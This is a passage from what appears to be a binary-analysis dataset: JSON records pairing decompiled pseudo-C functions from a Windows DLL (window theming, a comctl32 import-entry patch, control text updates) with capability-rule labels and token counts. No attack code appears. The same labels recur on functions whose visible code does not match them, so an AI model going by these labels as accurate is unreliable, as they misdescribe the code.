!= 0) {\n                *0x18012a200 = (**0x1800de458)(iVar5, \"SetWindowCompositionAttribute\");\n            }\n            if ((((*0x18012a1c0 != 0) && (*0x18012a1d0 != 0)) && ((*0x18012a208 != NULL && (*0x18012a1d8 != 0)))) &&\n               (((*0x18012a1f0 != NULL || (*0x18012a210 != NULL)) && ((*0x18012a1c8 != NULL && (*0x18012a1e0 != 0))))))\n            {\n                *0x18012a1e8 = '\\x01';\n            }\n        }\n    }\n    if (*0x18012a1e8 == '\\0') goto code_r0x00018001cf04;\n    if (*0x18012a1f0 == NULL) {\n        if (*0x18012a210 != NULL) {\n            (**0x18012a210)((*0x18012afa4 != '\\0') * '\\x02');\n        }\n    }\n    else {\n        (**0x18012a1f0)(*0x18012afa4 != '\\0');\n    }\n    if (*0x18012a1c8 != NULL) {\n        (**0x18012a1c8)();\n    }\n    iVar5 = (**0x1800de448)(L\"comctl32.dll\", 0, 0x800);\n    if (iVar5 != 0) {\n        iVar8 = *(*(iVar5 + 0x3c) + 0xf0 + iVar5) + iVar5;\n        uVar2 = *(iVar8 + 4);\n        while (uVar2 != 0) {\n            iVar4 = fcn.1800b35e4(uVar2 + iVar5, 0x1800f4978);\n            if (iVar4 == 0) {\n                piVar7 = *(iVar8 + 0x10) + iVar5;\n                puVar9 = *(iVar8 + 0xc) + iVar5;\n                iVar5 = *piVar7;\n                if (iVar5 != 0) goto code_r0x00018001ce7c;\n                break;\n            }\n            puVar1 = iVar8 + 0x24;\n            iVar8 = iVar8 + 0x20;\n            uVar2 = *puVar1;\n        }\n    }\n    goto code_r0x00018001cee8;\n    while( true ) {\n        iVar5 = piVar7[1];\n        piVar7 = piVar7 + 1;\n        puVar9 = puVar9 + 1;\n        if (iVar5 == 0) break;\ncode_r0x00018001ce7c:\n        if ((iVar5 < 0) && (iVar5 == 0x31)) {\n            if ((puVar9 != NULL) &&\n               ((iVar4 = (**0x1800de460)(puVar9, 8, 4, &uStack40),  iVar4 != 0 && (*0x18012a1c0 != 0)))) {\n                *puVar9 = 0x18001c640;\n                (**0x1800de460)(puVar9, 8, uStack40, &uStack40);\n            }\n            break;\n        }\n    }\ncode_r0x00018001cee8:\n    if ((*0x18012a208 != NULL) && (cVar3 = (**0x18012a208)(),  cVar3 != '\\0')) {\n        fcn.18001c520();\n    }\ncode_r0x00018001cf04:\n    fcn.18008fb00(uStack24 ^ auStack72);\n    return;\n}\n",
        "token_count": 1479
    },
    "18001d32": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18001d320(ulong arg1, ulong arg2, ulong *arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uchar auStack168 [32];\n    ulong uStack136;\n    uint *puStack128;\n    int64_t *piStack120;\n    int64_t *piStack112;\n    int64_t iStack104;\n    int64_t iStack96;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar auStack72 [16];\n    uint64_t uStack56;\n    \n    uStack56 = *0x180123080 ^ auStack168;\n    uVar1 = (**0x1800de7f0)(arg1, 0xf2);\n    uVar3 = (**0x1800de800)(arg1);\n    uVar5 = uVar3 & 0xf;\n    if ((uVar5 == 4) || (((uVar5 < 2 || (uVar6 = 3,  6 < uVar5)) && ((uVar5 == 4 || (uVar6 = 3,  uVar5 == 9)))))) {\n        uVar6 = 2;\n    }\n    if ((uVar3 >> 0x1b & 1) == 0) {\n        uVar5 = 3;\n        if (((uVar1 & 4) == 0) && (uVar5 = 1,  (uVar1 >> 9 & 1) != 0)) {\n            uVar5 = 2;\n        }\n    }\n    else {\n        uVar5 = 4;\n    }\n    if ((uVar1 & 1) == 0) {\n        if ((uVar1 & 2) != 0) {\n            uVar5 = uVar5 + 8;\n        }\n    }\n    else {\n        uVar5 = uVar5 + 4;\n    }\n    iVar2 = (**0x1800de848)(arg1, arg2);\n    if (iVar2 == 0) {\n        uStack84 = 0;\n        uStack80 = 1;\n        uStack76 = 0;\n        uStack88 = 0x10;\n        if (uVar5 != *(arg3 + 1)) {\n            puStack128 = &uStack76;\n            uStack136 = CONCAT44(uStack136._4_4_, 6000);\n            (**0x1800de898)(*arg3, uVar6);\n        }\n        auStack72 = ZEXT816(0);\n        (**0x1800de5d0)(arg1, auStack72);\n        piStack112 = &iStack96;\n        piStack120 = &iStack104;\n        iStack104 = 0;\n        puStack128 = &uStack88;\n        iStack96 = 0;\n        uStack136 = 0;\n        iVar4 = (**0x1800de840)(arg1, arg2, auStack72);\n        if (iVar4 == 0) {\n            uStack136 = uStack136 & 0xffffffff00000000 | uVar5;\n            fcn.18001cf20(arg1, arg2, *arg3, uVar6);\n            *(arg3 + 1) = uVar5;\n        }\n        else {\n            if (iStack104 != 0) {\n                uStack136 = uStack136 & 0xffffffff00000000 | *(arg3 + 1);\n                fcn.18001cf20(arg1, iStack104, *arg3, uVar6);\n            }\n            if (iStack96 != 0) {\n                uStack136 = uStack136 & 0xffffffff00000000 | uVar5;\n                fcn.18001cf20(arg1, iStack96, *arg3, uVar6);\n            }\n            *(arg3 + 1) = uVar5;\n            (**0x1800de888)(iVar4, 1);\n        }\n    }\n    fcn.18008fb00(uStack56 ^ auStack168);\n    return;\n}\n",
        "token_count": 939
    },
    "18001fa5": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.18001fa50(ulong arg1)\n\n{\n    char cVar1;\n    uint64_t in_RDX;\n    uchar auStack88 [32];\n    uint auStack56 [2];\n    uint auStack48 [2];\n    uint *puStack40;\n    ulong uStack32;\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack88;\n    if ((*0x18012a1e8 != '\\0') && (*0x18012a1d8 != NULL)) {\n        (**0x18012a1d8)(arg1, in_RDX & 0xffffffffffffff00 | *0x18012afa4 != '\\0');\n    }\n    auStack56[0] = 0;\n    if ((*0x18012a1e0 != NULL) && (*0x18012a208 != NULL)) {\n        cVar1 = (**0x18012a1e0)(arg1);\n        if (cVar1 != '\\0') {\n            cVar1 = (**0x18012a208)();\n            auStack56[0] = 0;\n            if (cVar1 != '\\0') {\n                cVar1 = fcn.18001c520();\n                auStack56[0] = 0;\n                if (cVar1 == '\\0') {\n                    auStack56[0] = 1;\n                }\n            }\n        }\n    }\n    if (*0x18012a1f8 < 0x47ba) {\n        (**0x1800de598)(arg1, 0x1800f48f8, auStack56[0]);\n    }\n    else if (*0x18012a200 != NULL) {\n        puStack40 = auStack56;\n        auStack48[0] = 0x1a;\n        uStack32 = 4;\n        (**0x18012a200)(arg1, auStack48);\n    }\n    fcn.18008fb00(uStack24 ^ auStack88);\n    return;\n}\n",
        "token_count": 444
    },
    "18001fbc": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.18001fbc0(ulong arg1)\n\n{\n    uint uVar1;\n    ulong uVar2;\n    char in_DL;\n    \n    if (*0x18012afa4 != '\\0') {\n        (**0x1800de068)(arg1, *0x180123d04);\n        (**0x1800de0a0)(arg1, *0x180123cfc);\n        uVar2 = *0x180123d38;\n        uVar1 = *0x180123d0c;\n        if (in_DL != '\\0') {\n            uVar1 = *0x180123d04;\n        }\n        (**0x1800de068)(arg1, uVar1);\n        return uVar2;\n    }\n    uVar2 = 0x11;\n    if (in_DL != '\\0') {\n        uVar2 = 8;\n    }\n    uVar1 = (**0x1800de818)(uVar2);\n    (**0x1800de068)(arg1, uVar1);\n    return 0;\n}\n",
        "token_count": 235
    },
    "180020c4": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.180020c40(void)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    uint16_t *puVar3;\n    int64_t iVar4;\n    uint16_t *puVar5;\n    bool bVar6;\n    bool bVar7;\n    \n    puVar3 = 0x180124d20;\n    iVar4 = -1;\n    do {\n        iVar4 = iVar4 + 1;\n    } while (*(iVar4 * 2 + 0x180124d20) != 0);\n    puVar5 = 0x180125578;\n    if (7 < *0x180125590) {\n        puVar5 = *0x180125578;\n    }\n    if (*0x180125588 == iVar4) {\n        if (*0x180125588 == 0) {\ncode_r0x000180020cbd:\n            return CONCAT71(puVar3 >> 8, 1);\n        }\n        uVar2 = *puVar5;\n        if (*0x180124d20 <= uVar2) {\n            bVar6 = uVar2 < *0x180124d20;\n            bVar7 = uVar2 == *0x180124d20;\n            iVar4 = *0x180125588;\n            do {\n                if (!bVar6 && !bVar7) break;\n                if (iVar4 == 1) goto code_r0x000180020cbd;\n                puVar1 = puVar5 + -0xc009268f + puVar3;\n                puVar3 = puVar3 + 1;\n                iVar4 = iVar4 + -1;\n                bVar6 = *puVar1 < *puVar3;\n                bVar7 = *puVar1 == *puVar3;\n            } while (!bVar6);\n        }\n    }\n    return puVar3 & 0xffffffffffffff00;\n}\n",
        "token_count": 418
    },
    "18002242": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nvoid fcn.180022420(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    ushort *puVar5;\n    uint *puVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    ulong uStack88;\n    uint64_t uStack72;\n    uint uStack64;\n    uint uStack60;\n    ushort uStack56;\n    ushort uStack54;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    ulong uStack40;\n    uint64_t uStack32;\n    ulong uStack24;\n    \n    uStack24 = 0xfffffffffffffffe;\n    if (*(arg1 + 0x61) == '\\0') {\n        uStack72 = CONCAT44(*0x180101904, *0x180101900);\n        uStack64 = *0x180101908;\n        uStack60 = *0x18010190c;\n        uStack88._0_2_ = 0;\n        fcn.180010d70(&uStack88, 0x1800f5fa8, 0x1e);\n        uVar4 = uStack72;\n        if (CONCAT44(uStack60, uStack64) == uStack72) {\n            puVar6 = fcn.180013690(&uStack88, 1, 0, 0x1800f4b2c);\n        }\n        else {\n            uVar1 = uStack72 + 1;\n            uStack72 = uVar1;\n            puVar5 = &uStack88;\n            if (7 < CONCAT44(uStack60, uStack64)) {\n                puVar5 = CONCAT62(uStack88._2_6_, uStack88);\n            }\n            puVar5[uVar4] = 0x2a;\n            puVar5[uVar1] = 0;\n            puVar6 = &uStack88;\n        }\n        uStack56 = *puVar6;\n        uStack54 = *puVar6 >> 0x10;\n        uStack52 = puVar6[1];\n        uStack48 = puVar6[2];\n        uStack44 = puVar6[3];\n        uStack40 = *(puVar6 + 4);\n        uStack32 = *(puVar6 + 6);\n        *(puVar6 + 4) = 0;\n        *(puVar6 + 6) = 7;\n        *puVar6 = 0;\n        puVar5 = &uStack56;\n        if (7 < uStack32) {\n            puVar5 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x23e7, puVar5);\n        if (uStack32 < 8) {\ncode_r0x000180022573:\n            uStack40 = CONCAT44(*0x180101904, *0x180101900);\n            uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack56 = 0;\n            if (CONCAT44(uStack60, uStack64) < 8) {\ncode_r0x0001800225c4:\n                fcn.180068600(*(arg1 + 0x18), 0x23e7);\n                goto code_r0x0001800225d2;\n            }\n            iVar8 = CONCAT62(uStack88._2_6_, uStack88);\n            iVar7 = iVar8;\n            if ((CONCAT44(uStack60, uStack64) * 2 + 2 < 0x1000) || (iVar7 = *(iVar8 + -8),  (iVar8 - iVar7) - 8U < 0x20)\n               ) {\n                fcn.18008fb24(iVar7);\n                goto code_r0x0001800225c4;\n            }\n        }\n        else {\n            iVar8 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            iVar7 = iVar8;\n            if ((uStack32 * 2 + 2 < 0x1000) || (iVar7 = *(iVar8 + -8),  (iVar8 - iVar7) - 8U < 0x20)) {\n                fcn.18008fb24(iVar7);\n                goto code_r0x000180022573;\n            }\ncode_r0x000180022a85:\n            fcn.1800b3528();\n        }\n        fcn.1800b3528();\ncode_r0x000180022a91:\n        fcn.1800b3528();\ncode_r0x000180022a97:\n        fcn.1800b3528();\ncode_r0x000180022a9d:\n        fcn.1800b3528();\n    }\n    else {\n        (**0x1800de788)(*(arg1 + 0x18), 0x23e7, 0x1800f5f68);\n        fcn.180068540(*(arg1 + 0x18), 0x23e7);\ncode_r0x0001800225d2:\n        if (*(arg1 + 0x62) == '\\0') {\n            uStack72 = CONCAT44(*0x180101904, *0x180101900);\n            uStack64 = *0x180101908;\n            uStack60 = *0x18010190c;\n            uStack88._0_2_ = 0;\n            fcn.180010d70(&uStack88, 0x1800f5ff8, 6);\n            uVar4 = uStack72;\n            if (CONCAT44(uStack60, uStack64) == uStack72) {\n                puVar6 = fcn.180013690(&uStack88, 1, 0, 0x1800f4b3c);\n            }\n            else {\n                uVar1 = uStack72 + 1;\n                uStack72 = uVar1;\n                puVar5 = &uStack88;\n                if (7 < CONCAT44(uStack60, uStack64)) {\n                    puVar5 = CONCAT62(uStack88._2_6_, uStack88);\n                }\n                puVar5[uVar4] = 0x2a;\n                puVar5[uVar1] = 0;\n                puVar6 = &uStack88;\n            }\n            uStack56 = *puVar6;\n            uStack54 = *puVar6 >> 0x10;\n            uStack52 = puVar6[1];\n            uStack48 = puVar6[2];\n            uStack44 = puVar6[3];\n            uStack40 = *(puVar6 + 4);\n            uStack32 = *(puVar6 + 6);\n            *(puVar6 + 4) = 0;\n            *(puVar6 + 6) = 7;\n            *puVar6 = 0;\n            puVar5 = &uStack56;\n            if (7 < uStack32) {\n                puVar5 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            }\n            (**0x1800de788)(*(arg1 + 0x18), 0x23a3, puVar5);\n            if (7 < uStack32) {\n                iVar8 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n                iVar7 = iVar8;\n                if ((uStack32 * 2 + 2 < 0x1000) || (iVar7 = *(iVar8 + -8),  (iVar8 - iVar7) - 8U < 0x20)) {\n                    fcn.18008fb24(iVar7);\n                    goto code_r0x0001800226fb;\n                }\n                goto code_r0x000180022a91;\n            }\ncode_r0x0001800226fb:\n            uStack40 = CONCAT44(*0x180101904, *0x180101900);\n            uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack56 = 0;\n            if (CONCAT44(uStack60, uStack64) < 8) {\ncode_r0x00018002274c:\n                fcn.180068600(*(arg1 + 0x18), 0x23a3);\n                goto code_r0x00018002275a;\n            }\n            iVar8 = CONCAT62(uStack88._2_6_, uStack88);\n            iVar7 = iVar8;\n            if ((CONCAT44(uStack60, uStack64) * 2 + 2 < 0x1000) || (iVar7 = *(iVar8 + -8),  (iVar8 - iVar7) - 8U < 0x20)\n               ) {\n                fcn.18008fb24(iVar7);\n                goto code_r0x00018002274c;\n            }\n            goto code_r0x000180022a97;\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x23a3, 0x1800f5fe8);\n        fcn.180068540(*(arg1 + 0x18), 0x23a3);\ncode_r0x00018002275a:\n        if (*(arg1 + 99) != '\\0') {\n            (**0x1800de788)(*(arg1 + 0x18), 0x23c3, 0x1800f6008);\n            fcn.180068540(*(arg1 + 0x18), 0x23c3);\ncode_r0x0001800228e2:\n            if (*(arg1 + 100) != '\\0') {\n                (**0x1800de788)(*(arg1 + 0x18), 0x23d8, 0x1800f6028);\n                fcn.180068540(*(arg1 + 0x18), 0x23d8);\n                return;\n            }\n            uStack72 = CONCAT44(*0x180101904, *0x180101900);\n            uStack64 = *0x180101908;\n            uStack60 = *0x18010190c;\n            uStack88._0_2_ = 0;\n            fcn.180010d70(&uStack88, 0x1800f6038, 6);\n            uVar4 = uStack72;\n            if (CONCAT44(uStack60, uStack64) == uStack72) {\n                puVar6 = fcn.180013690(&uStack88, 1, 0, 0x1800f4b9c);\n            }\n            else {\n                uVar1 = uStack72 + 1;\n                uStack72 = uVar1;\n                puVar5 = &uStack88;\n                if (7 < CONCAT44(uStack60, uStack64)) {\n                    puVar5 = CONCAT62(uStack88._2_6_, uStack88);\n                }\n                puVar5[uVar4] = 0x2a;\n                puVar5[uVar1] = 0;\n                puVar6 = &uStack88;\n            }\n            uStack56 = *puVar6;\n            uStack54 = *puVar6 >> 0x10;\n            uStack52 = puVar6[1];\n            uStack48 = puVar6[2];\n            uStack44 = puVar6[3];\n            uStack40 = *(puVar6 + 4);\n            uStack32 = *(puVar6 + 6);\n            *(puVar6 + 4) = 0;\n            *(puVar6 + 6) = 7;\n            *puVar6 = 0;\n            puVar5 = &uStack56;\n            if (7 < uStack32) {\n                puVar5 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            }\n            (**0x1800de788)(*(arg1 + 0x18), 0x23d8, puVar5);\n            if (7 < uStack32) {\n                iVar8 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n                iVar7 = iVar8;\n                if ((0xfff < uStack32 * 2 + 2) && (iVar7 = *(iVar8 + -8),  0x1f < (iVar8 - iVar7) - 8U))\n                goto code_r0x000180022aa9;\n                fcn.18008fb24(iVar7);\n            }\n            uStack40 = CONCAT44(*0x180101904, *0x180101900);\n            uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n            uStack56 = 0;\n            if (CONCAT44(uStack60, uStack64) < 8) goto code_r0x000180022a58;\n            iVar7 = CONCAT44(uStack60, uStack64) * 2;\n            iVar3 = CONCAT62(uStack88._2_6_, uStack88);\n            iVar8 = iVar3;\n            if (0xfff < iVar7 + 2U) {\n                iVar8 = *(iVar3 + -8);\n                if (0x1f < (iVar3 - iVar8) - 8U) {\n                    fcn.1800b3528(uStack40, iVar8, iVar7 + 0x29);\n                    goto code_r0x000180022a85;\n                }\n            }\n            fcn.18008fb24(iVar8);\ncode_r0x000180022a58:\n            fcn.180068600(*(arg1 + 0x18), 0x23d8);\n            return;\n        }\n        uStack72 = CONCAT44(*0x180101904, *0x180101900);\n        uStack64 = *0x180101908;\n        uStack60 = *0x18010190c;\n        uStack88._0_2_ = 0;\n        fcn.180010d70(&uStack88, 0x1800f6018, 6);\n        uVar4 = uStack72;\n        if (CONCAT44(uStack60, uStack64) == uStack72) {\n            puVar6 = fcn.180013690(&uStack88, 1, 0, 0x1800f4b8c);\n        }\n        else {\n            uVar1 = uStack72 + 1;\n            uStack72 = uVar1;\n            puVar5 = &uStack88;\n            if (7 < CONCAT44(uStack60, uStack64)) {\n                puVar5 = CONCAT62(uStack88._2_6_, uStack88);\n            }\n            puVar5[uVar4] = 0x2a;\n            puVar5[uVar1] = 0;\n            puVar6 = &uStack88;\n        }\n        uStack56 = *puVar6;\n        uStack54 = *puVar6 >> 0x10;\n        uStack52 = puVar6[1];\n        uStack48 = puVar6[2];\n        uStack44 = puVar6[3];\n        uStack40 = *(puVar6 + 4);\n        uStack32 = *(puVar6 + 6);\n        *(puVar6 + 4) = 0;\n        *(puVar6 + 6) = 7;\n        *puVar6 = 0;\n        puVar5 = &uStack56;\n        if (7 < uStack32) {\n            puVar5 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x23c3, puVar5);\n        if (7 < uStack32) {\n            iVar8 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            iVar7 = iVar8;\n            if ((uStack32 * 2 + 2 < 0x1000) || (iVar7 = *(iVar8 + -8),  (iVar8 - iVar7) - 8U < 0x20)) {\n                fcn.18008fb24(iVar7);\n                goto code_r0x000180022883;\n            }\n            goto code_r0x000180022a9d;\n        }\ncode_r0x000180022883:\n        uStack40 = CONCAT44(*0x180101904, *0x180101900);\n        uStack32 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack56 = 0;\n        if (CONCAT44(uStack60, uStack64) < 8) {\ncode_r0x0001800228d4:\n            fcn.180068600(*(arg1 + 0x18), 0x23c3);\n            goto code_r0x0001800228e2;\n        }\n        iVar8 = CONCAT62(uStack88._2_6_, uStack88);\n        iVar7 = iVar8;\n        if ((CONCAT44(uStack60, uStack64) * 2 + 2 < 0x1000) || (iVar7 = *(iVar8 + -8),  (iVar8 - iVar7) - 8U < 0x20)) {\n            fcn.18008fb24(iVar7);\n            goto code_r0x0001800228d4;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x000180022aa9:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 3919
    },
    "180022e9": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_bp_30h\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid fcn.180022e90(int64_t arg1, ulong arg2, ulong arg3, ulong *arg4)\n\n{\n    uint8_t **ppuVar1;\n    ulong ****ppppuVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint uVar5;\n    int64_t iVar6;\n    uchar uVar7;\n    uint uVar8;\n    int32_t iVar9;\n    ulong uVar10;\n    uint8_t **ppuVar11;\n    ulong *****pppppuVar12;\n    ulong ******ppppppuVar13;\n    uint64_t *puVar14;\n    ulong *****pppppuVar15;\n    ulong *****pppppuVar16;\n    uint64_t ****ppppuVar17;\n    uint64_t *****pppppuVar18;\n    ulong arg4_00;\n    int64_t iVar19;\n    uint64_t uVar20;\n    uint64_t *****pppppuVar21;\n    ulong ****ppppuVar22;\n    ulong *puVar23;\n    uint64_t uVar24;\n    uint64_t uVar25;\n    uint64_t ******ppppppuVar26;\n    uint64_t uVar27;\n    ulong ******ppppppuVar28;\n    uint64_t ******ppppppuVar29;\n    int64_t iVar30;\n    uint32_t uVar31;\n    int64_t iVar32;\n    uint32_t uVar33;\n    uint *puVar34;\n    ulong var_80h;\n    ulong var_90h;\n    ulong var_98h;\n    ulong var_a0h;\n    ulong var_b0h;\n    ulong var_b8h;\n    ulong var_c0h;\n    uchar auStack536 [32];\n    ulong ******ppppppuStack504;\n    uint64_t *****pppppuStack496;\n    uint64_t *****pppppuStack488;\n    uint uStack480;\n    uint uStack476;\n    uint64_t uStack472;\n    uint64_t uStack464;\n    ulong ******ppppppuStack456;\n    uint uStack448;\n    uint uStack444;\n    uint64_t uStack440;\n    uint64_t uStack432;\n    uint32_t uStack424;\n    uchar uStack416;\n    uchar uStack415;\n    unkbyte6 Stack414;\n    ulong uStack400;\n    uint64_t uStack392;\n    uchar uStack384;\n    unkbyte7 Stack383;\n    ulong uStack368;\n    uint64_t uStack360;\n    uint64_t *****pppppuStack352;\n    uint uStack344;\n    uint uStack340;\n    uint64_t uStack336;\n    uint64_t uStack328;\n    ulong ******ppppppuStack320;\n    int32_t aiStack312 [2];\n    ulong uStack304;\n    uint64_t *****pppppuStack296;\n    ulong uStack288;\n    uchar auStack280 [128];\n    uint64_t ******appppppuStack152 [2];\n    uint64_t uStack136;\n    uint64_t var_bp_78h;\n    int64_t var_bp_70h;\n    ulong var_68h;\n    ulong uStack104;\n    int64_t var_58h;\n    uint64_t var_50h;\n    ulong var_48h;\n    ulong var_38h;\n    ulong var_bp_30h;\n    ulong var_28h;\n    ulong var_bp_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_8h;\n    \n    uStack288 = 0xfffffffffffffffe;\n    var_50h = *0x180123080 ^ auStack536;\n    uStack424 = 0;\n    uStack304 = arg3;\n    uVar10 = fcn.1800687b0(auStack280);\n    puVar23 = arg4;\n    if (7 < arg4[3]) {\n        puVar23 = *arg4;\n    }\n    fcn.180068c50(uVar10, appppppuStack152, puVar23, puVar23 + arg4[2] * 2);\n    uStack424 = 3;\n    fcn.1800686c0(auStack280);\n    iVar32 = arg2 * 0xf0 + *(arg1 + 0xd8);\n    ppppppuStack320 = &pppppuStack352;\n    pppppuStack496 = fcn.18000de50(&pppppuStack352, appppppuStack152);\n    uStack368 = CONCAT44(*0x180101914, *0x180101910);\n    uStack360 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack384 = 0;\n    fcn.180011120(&uStack384, 0x1800f4687, 0);\n    uStack472 = CONCAT44(*0x180101914, *0x180101910);\n    uStack464 = CONCAT44(*0x18010191c, *0x180101918);\n    pppppuStack488 = pppppuStack488 & 0xffffffffffffff00;\n    pppppuVar18 = &pppppuStack488;\n    fcn.180011120(pppppuVar18, 0x1800f6058, 9);\n    ppppppuStack504 = &uStack384;\n    uVar10 = fcn.180004f50(pppppuVar18, &uStack416, arg3, &pppppuStack488);\n    fcn.18000d960(iVar32, uVar10);\n    if (uStack392 < 8) {\ncode_r0x000180023002:\n        uStack400 = *0x180101900;\n        uStack392 = *0x180101908;\n        uStack416 = 0;\n        uStack415 = 0;\n        if (0xf < uStack464) {\n            pppppuVar18 = pppppuStack488;\n            if ((0xfff < uStack464 + 1) &&\n               (pppppuVar18 = pppppuStack488[-1],  0x1f < pppppuStack488 + (-8 - pppppuVar18)))\n            goto code_r0x000180024aba;\n            fcn.18008fb24(pppppuVar18);\n        }\n        uStack472 = CONCAT44(*0x180101914, *0x180101910);\n        uStack464 = CONCAT44(*0x18010191c, *0x180101918);\n        pppppuStack488 = pppppuStack488 & 0xffffffffffffff00;\n        if (0xf < uStack360) {\n            iVar6 = CONCAT71(Stack383, uStack384);\n            iVar19 = iVar6;\n            if ((0xfff < uStack360 + 1) && (iVar19 = *(iVar6 + -8),  0x1f < (iVar6 - iVar19) - 8U))\n            goto code_r0x000180024ac0;\n            fcn.18008fb24(iVar19);\n        }\n        uVar27 = var_bp_78h;\n        uVar24 = uStack136;\n        ppppppuVar26 = appppppuStack152[0];\n        ppppppuStack320 = &pppppuStack488;\n        uStack472 = 0;\n        uStack464 = 0;\n        ppppppuVar29 = appppppuStack152;\n        if (0xf < var_bp_78h) {\n            ppppppuVar29 = appppppuStack152[0];\n        }\n        if (0xf < uStack136) {\n            uVar25 = uStack136 | 0xf;\n            if (0x7fffffffffffffff < uVar25) {\n                uVar25 = 0x7fffffffffffffff;\n            }\n            pppppuVar18 = uVar25 + 1;\n            if (pppppuVar18 < 0x1000) {\n                if (pppppuVar18 != NULL) {\n                    pppppuVar18 = fcn.18008fb2c(pppppuVar18);\n                }\ncode_r0x00018002314c:\n                pppppuStack488 = pppppuVar18;\n                fcn.1800ade80(pppppuVar18, ppppppuVar29, uVar24 + 1);\n                goto code_r0x000180023160;\n            }\n            pppppuVar21 = uVar25 + 0x28;\n            if (pppppuVar21 <= pppppuVar18) {\n                pppppuVar21 = 0xffffffffffffffff;\n            }\n            ppppuVar17 = fcn.18008fb2c(pppppuVar21);\n            if (ppppuVar17 != NULL) {\n                pppppuVar18 = ppppuVar17 + 0x27U & 0xffffffffffffffe0;\n                pppppuVar18[-1] = ppppuVar17;\n                goto code_r0x00018002314c;\n            }\n            goto code_r0x000180024ad2;\n        }\n        pppppuStack488 = *ppppppuVar29;\n        uStack480 = *(ppppppuVar29 + 1);\n        uStack476 = *(ppppppuVar29 + 0xc);\n        uVar25 = 0xf;\ncode_r0x000180023160:\n        uStack472 = uVar24;\n        uStack368 = CONCAT44(*0x180101914, *0x180101910);\n        uStack360 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack384 = 0;\n        uStack464 = uVar25;\n        fcn.180011120(&uStack384, 0x1800f468f, 0);\n        uStack336 = CONCAT44(*0x180101914, *0x180101910);\n        uStack328 = CONCAT44(*0x18010191c, *0x180101918);\n        pppppuStack352 = pppppuStack352 & 0xffffffffffffff00;\n        pppppuVar18 = &pppppuStack352;\n        fcn.180011120(pppppuVar18, 0x1800f6068, 9);\n        pppppuStack496 = &pppppuStack488;\n        ppppppuStack504 = &uStack384;\n        uVar10 = fcn.180004f50(pppppuVar18, &uStack416, arg3, &pppppuStack352);\n        fcn.18000d960(iVar32 + 0x20, uVar10);\n        if (7 < uStack392) {\n            iVar6 = CONCAT62(Stack414, CONCAT11(uStack415, uStack416));\n            iVar19 = iVar6;\n            if ((0xfff < uStack392 * 2 + 2) && (iVar19 = 